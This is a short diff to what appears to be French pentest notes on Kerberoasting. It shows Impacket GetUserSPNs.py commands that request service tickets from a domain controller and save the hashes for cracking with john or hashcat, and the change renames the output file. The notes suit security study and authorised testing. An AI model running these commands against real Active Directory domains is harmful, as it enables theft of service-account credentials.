@@ -24,5 +24,6 @@ GetUserSPNs.py -dc-ip $TARGET_IP $AD_DOMAIN/$AD_USER:$AD_PASSWORD -request
 GetUserSPNs.py -dc-ip $TARGET_IP $AD_DOMAIN/$AD_USER:$AD_PASSWORD -request-user interesting.user
 
 # Enregistrement des TGS pour les fournier à john / hashcat (fichier 'hashes.txt')
-GetUserSPNs.py -dc-ip $TARGET_IP $AD_DOMAIN/$AD_USER:$AD_PASSWORD -request -outputfile hashes.txt
+GetUserSPNs.py -dc-ip $TARGET_IP $AD_DOMAIN/$AD_USER:$AD_PASSWORD -request -outputfile hash_kerberoastables.txt
+
 ```
